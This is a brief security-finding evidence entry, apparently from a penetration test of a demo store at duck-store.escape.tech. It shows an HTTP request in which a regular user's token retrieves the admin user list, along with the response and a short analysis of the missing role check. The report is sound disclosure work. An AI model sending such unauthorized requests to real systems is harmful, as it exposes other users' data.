## Evidence: bac-admin-users — Broken Access Control on Admin Users Endpoint

### Request
GET /api/v1/admin/users HTTP/1.1
Host: duck-store.escape.tech
Authorization: Bearer eyJ...regular-user-token

### Response
HTTP/1.1 200 OK
Content-Type: application/json

{"UserList":[{"username":"admin","role":"admin","email":"admin@duck-store.escape.tech"},{"username":"victim","role":"user","email":"victim@example.com"}],"total":2}

### Analysis
The /api/v1/admin/users endpoint returns the full UserList to non-admin authenticated users. No role-based access control is enforced on this admin endpoint.
